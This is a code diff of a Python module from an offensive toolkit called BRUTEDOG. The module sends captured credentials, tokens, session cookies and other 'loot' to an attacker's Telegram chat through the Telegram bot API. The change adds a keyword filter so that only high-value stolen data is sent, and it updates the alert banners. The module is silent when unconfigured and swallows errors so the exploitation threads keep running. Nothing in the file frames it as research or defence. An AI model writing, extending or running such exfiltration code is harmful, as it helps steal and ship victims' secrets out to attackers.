@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """
-TELEGRAM_NOTIFIER.PY v8.7 — Centralized Offensive Telemetry & Alert Dispatcher (Elite Red Team Adversarial Edition)
+TELEGRAM_NOTIFIER.PY v8.8 — Centralized Zero-Noise Telemetry & Alert Dispatcher (Elite Red Team Adversarial Edition)
 Features:
-- Asynchronously dispatches captured credentials, tokens, session cookies, and loot to Telegram
-- Automatic HTML escaping and safe chunking for payloads exceeding Telegram's length limit
-- Resilient non-blocking exception handling to keep core exploitation threads uninterrupted
+- Zero-noise filtering: Restricts broadcasts strictly to verified high-value breach loot and critical exploit pivots.
+- Asynchronously dispatches captured credentials, tokens, session cookies, and high-value loot to Telegram.
+- Automatic HTML escaping and safe chunking for payloads exceeding Telegram's length limit.
+- Resilient non-blocking exception handling to keep core exploitation threads uninterrupted.
 """
 import os
 import asyncio
@@ -16,18 +17,28 @@ import html
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", os.getenv("BRUTEDOG_TG_TOKEN", "YOUR_BOT_TOKEN_HERE"))
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", os.getenv("BRUTEDOG_TG_CHAT", "YOUR_CHAT_ID_HERE"))
 
+# Keywords required to pass the zero-noise filter (must contain high-value exploit indicators)
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump"
+]
+
 def _escape_html(text: str) -> str:
     """Safely sanitize text to prevent Telegram HTML parse failures on special characters."""
     return html.escape(str(text))
 
 async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
     """
-    Asynchronously dispatches captured credentials, tokens, session cookies, 
-    and exploitation loot to a designated Telegram chat with automatic HTML escaping 
-    and payload chunking.
+    Asynchronously dispatches verified high-value loot to Telegram. 
+    Enforces a strict zero-noise filter to eliminate low-priority chatter.
     """
     if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         return  # Silent pass if telemetry destination is unconfigured
+
+    # Zero-Noise Filtering Gate: Verify loot type or details contain elite signal
+    check_str = f"{loot_type} {str(details)}".lower()
+    if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+        return  # Suppress low-value or noisy telemetry messages completely
 
     api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     
@@ -43,7 +54,7 @@ async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
         details_str = f"<code>{_escape_html(details)}</code>"
 
     base_header = (
-        f"🚨 <b>BRUTEDOG V8.7 — CRITICAL LOOT CAPTURED</b> 🚨\n"
+        f"🚨 <b>BRUTEDOG V8.8 — VERIFIED EXPLOIT LOOT</b> 🚨\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🎯 <b>Vector:</b> <code>{_escape_html(loot_type.upper())}</code>\n\n"
     )
@@ -59,7 +70,7 @@ async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
         chunks = [details_str[i:i+max_chunk_size] for i in range(0, len(details_str), max_chunk_size)]
         for idx, chunk in enumerate(chunks, 1):
             messages.append(
-                f"🚨 <b>BRUTEDOG V8.7 [Part {idx}/{len(chunks)}]</b> 🚨\n"
+                f"🚨 <b>BRUTEDOG V8.8 [Part {idx}/{len(chunks)}]</b> 🚨\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"🎯 <b>Vector:</b> <code>{_escape_html(loot_type.upper())}</code>\n\n"
                 f"{chunk}\n"
@@ -77,7 +88,7 @@ async def send_telegram_alert(loot_type: str, details: Union[dict, str]):
                     "parse_mode": "HTML",
                     "disable_web_page_preview": True
                 }
-                response = await client.post(api_url, json=payload)
+                await client.post(api_url, json=payload)
                 if len(messages) > 1:
                     await asyncio.sleep(0.3)  # Rate-limit safety pause between chunks
     except Exception:
